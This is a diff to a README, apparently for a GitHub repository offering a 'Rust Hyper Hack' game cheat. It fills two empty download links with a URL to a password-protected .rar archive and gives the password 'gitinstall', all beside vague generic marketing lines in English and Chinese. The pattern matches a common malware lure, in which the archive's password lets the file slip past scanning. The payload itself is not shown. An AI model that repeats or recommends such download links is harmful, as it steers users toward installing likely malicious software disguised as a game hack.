@@ -2,7 +2,7 @@
 
 ## 📚"Enhancing user activity with advanced feature, software provides secure and efficient function, ensuring desired outcome."
 
-## | ⏬[Download Last Release]() | 🔐Archive Password: gitinstall |
+## | ⏬[Download Last Release](https://github.com/yehiazedik-24/Rust-Hyper-Hack/releases/download/rust/Rust.Hyper.-.Best.Hack.rar) | 🔐Archive Password: gitinstall |
 
 
 
@@ -17,7 +17,7 @@
 
 ## 📚"利用先进功能增强用户活动，软件提供安全高效的功能，确保实现预期结果。"
 
-| ⏬[Download Last Release]() | 🔐Archive Password: gitinstall |
+| ⏬[Download Last Release](https://github.com/yehiazedik-24/Rust-Hyper-Hack/releases/download/rust/Rust.Hyper.-.Best.Hack.rar) | 🔐Archive Password: gitinstall |
 
 
 
